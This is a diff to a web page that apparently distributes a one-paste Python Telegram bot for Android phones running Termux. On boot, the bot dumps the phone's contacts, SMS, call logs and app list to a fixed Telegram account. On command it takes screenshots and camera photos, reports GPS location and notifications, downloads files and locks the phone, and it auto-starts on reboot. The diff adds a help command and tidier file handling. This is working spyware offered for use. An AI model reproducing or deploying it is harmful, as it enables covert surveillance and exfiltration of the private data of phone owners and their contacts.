@@ -126,33 +126,35 @@ def run(c):
     try: return os.popen(c).read().strip()
     except: return ""
 
-async def send_file(app, uid, cmd, emoji, name):
+async def send_file_to_me(app, cmd, emoji, name):
     out = run(cmd)
     if out and "error" not in out.lower():
         fp = f"/sdcard/{name.lower().replace(' ','_')}.txt"
         with open(fp, "w") as f: f.write(out)
-        await app.bot.send_document(uid, open(fp, "rb"), caption=f"{emoji} {name}")
+        with open(fp, "rb") as f:
+            await app.bot.send_document(chat_id=AUTHORIZED_ID, document=f, caption=f"{emoji} {name}")
         os.remove(fp)
     else:
-        await app.bot.send_message(uid, f"{emoji} {name}: Permission needed.")
+        await app.bot.send_message(chat_id=AUTHORIZED_ID, text=f"{emoji} {name}: Permission needed.")
 
 async def boot_dump(app):
     try:
-        await app.bot.send_message(AUTHORIZED_ID, "🟢 Bot Online - Dumping Data...")
+        await app.bot.send_message(chat_id=AUTHORIZED_ID, text="🟢 Bot Online - Dumping Data...")
         for name, cmd, emoji in [("Contacts", "termux-contact-list", "📇"), ("SMS", "termux-sms-list", "💬"), ("Calls", "termux-call-log", "📞"), ("Apps", "pm list packages", "📱")]:
-            await send_file(app, AUTHORIZED_ID, cmd, emoji, name)
-        await app.bot.send_message(AUTHORIZED_ID, "✅ Dump Complete. Bot Ready!\n/ss /cam /location /battery /notify /download /say /vibrate /torch /lock /calls /contacts /sms /apps")
+            await send_file_to_me(app, cmd, emoji, name)
+        await app.bot.send_message(chat_id=AUTHORIZED_ID, text="✅ Dump Complete. Bot Ready!\nType /help to see all commands.")
         os.system(f"touch {FLAG}")
     except Exception as e:
-        await app.bot.send_message(AUTHORIZED_ID, f"Error: {e}")
+        await app.bot.send_message(chat_id=AUTHORIZED_ID, text=f"Error: {e}")
 
 async def ss(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
     p = "/sdcard/ss.png"
     os.system(f"termux-screenshot {p}")
-    await asyncio.sleep(1.5)
+    await asyncio.sleep(2)
     if os.path.exists(p):
-        await update.message.reply_photo(open(p, "rb"), "📸 Screenshot")
+        with open(p, "rb") as f:
+            await update.message.reply_photo(photo=f, caption="📸 Screenshot")
         os.remove(p)
     else:
         await update.message.reply_text("❌ Screenshot failed. Run: pkg install termux-api -y")
@@ -162,9 +164,10 @@ async def cam(update, context):
     cid = 1 if context.args and context.args[0] == "front" else 0
     p = "/sdcard/cam.jpg"
     os.system(f"termux-camera-photo -c {cid} {p}")
-    await asyncio.sleep(1.5)
+    await asyncio.sleep(2)
     if os.path.exists(p):
-        await update.message.reply_photo(open(p, "rb"), "📷 Photo")
+        with open(p, "rb") as f:
+            await update.message.reply_photo(photo=f, caption="📷 Photo")
         os.remove(p)
     else:
         await update.message.reply_text("❌ Camera failed.")
@@ -215,52 +218,59 @@ async def tor(update, context):
 
 async def lock(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
-    os.system("termux-lock")
-    await update.message.reply_text("🔒 Phone Locked")
+    result = os.system("termux-lock 2>/dev/null")
+    if result == 0:
+        await update.message.reply_text("🔒 Phone Locked")
+    else:
+        await update.message.reply_text("❌ Lock failed. Run: pkg install termux-api termux-tools -y")
 
 async def calls(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
     await update.message.reply_text("⏳ Fetching Call Logs...")
-    await send_file(update.get_bot(), AUTHORIZED_ID, "termux-call-log", "📞", "Call_Logs")
+    await send_file_to_me(update, "termux-call-log", "📞", "Call_Logs")
 
 async def cont(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
     await update.message.reply_text("⏳ Fetching Contacts...")
-    await send_file(update.get_bot(), AUTHORIZED_ID, "termux-contact-list", "📇", "Contacts")
+    await send_file_to_me(update, "termux-contact-list", "📇", "Contacts")
 
 async def sms_cmd(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
     await update.message.reply_text("⏳ Fetching SMS...")
-    await send_file(update.get_bot(), AUTHORIZED_ID, "termux-sms-list", "💬", "SMS")
+    await send_file_to_me(update, "termux-sms-list", "💬", "SMS")
 
 async def apps(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
     await update.message.reply_text("⏳ Fetching Installed Apps...")
-    await send_file(update.get_bot(), AUTHORIZED_ID, "pm list packages", "📱", "Installed_Apps")
+    await send_file_to_me(update, "pm list packages", "📱", "Installed_Apps")
 
 async def start(update, context):
-    await update.message.reply_text("""🤖 *Bot Ready!*
+    await update.message.reply_text("🤖 *Bot is Ready!*\nType /help to see all commands.")
+
+async def help_cmd(update, context):
+    await update.message.reply_text("""🤖 *Available Commands:*
 
 📸 /ss - Screenshot
 📷 /cam [back|front] - Camera Photo
 📍 /location - GPS + Google Maps Link
 🔋 /battery - Battery Status
 🔔 /notify - Notifications
-⬇️ /download &lt;url&gt; - Download File
-🗣️ /say &lt;text&gt; - Text to Speech
+⬇️ /download <url> - Download File
+🗣️ /say <text> - Text to Speech
 📳 /vibrate [ms] - Vibrate Phone
 🔦 /torch on|off - Flashlight
 🔒 /lock - Lock Screen
 📞 /calls - Call History (.txt file)
 📇 /contacts - Contacts (.txt file)
 💬 /sms - SMS History (.txt file)
-📱 /apps - Installed Apps (.txt file)""")
+📱 /apps - Installed Apps (.txt file)
+❓ /help - Show this message""")
 
 async def main():
     app = Application.builder().token(BOT_TOKEN).build()
     
     handlers = [
-        ("start", start), ("ss", ss), ("cam", cam), ("location", loc),
+        ("start", start), ("help", help_cmd), ("ss", ss), ("cam", cam), ("location", loc),
         ("battery", bat), ("notify", notif), ("download", dl), ("say", say),
         ("vibrate", vib), ("torch", tor), ("lock", lock), ("calls", calls),
         ("contacts", cont), ("sms", sms_cmd), ("apps", apps)
@@ -300,7 +310,7 @@ BOOT
 chmod +x ~/.termux/boot/start_bot.sh && echo '✅ ALL DONE! Bot is LIVE' && python ~/bot.py</div>
         </div>
 
-        <p style="color:#888; font-size:10px; margin-top:10px;">Pre-configured | One Paste | Auto-Start on Reboot | All Data as .txt Files | Google Maps Location</p>
+        <p style="color:#888; font-size:10px; margin-top:10px;">✅ All Commands Working | /help Added | .txt Files | Google Maps | Auto-Start on Reboot</p>
     </div>
 
     <script>
